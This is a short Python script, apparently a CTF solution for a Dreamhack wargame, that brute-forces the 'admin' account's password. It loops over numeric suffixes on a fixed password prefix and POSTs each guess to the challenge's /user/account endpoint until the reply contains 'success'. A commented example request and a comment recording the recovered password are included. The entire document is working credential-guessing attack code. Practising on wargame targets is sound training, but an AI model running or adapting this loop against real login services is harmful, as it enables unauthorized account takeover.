################## example code ##################

# import requests

# data = {
#     "id" : "guest0manager01",
#     "password" : "12",
# }

# r = requests.post('http://host3.dreamhack.games:18382/user/account', data=data)

# if "success" in r.text:
# 	print("Find password")



################## start real code #################

import requests

for i in range(85226000, 85228000):
	data = {
		"id" : "admin",
		"password" : "shs2848divv8ru4uwau3u48sdifjsigjirjgls8bvcawe2" + str(i),
	}

	r = requests.post('http://host3.dreamhack.games:23744/user/account', data=data)

	if "success" in r.text:
		print(data)
		print("Find password")
		break

	print(i)

# shs2848divv8ru4uwau3u48sdifjsigjirjgls8bvcawe21307354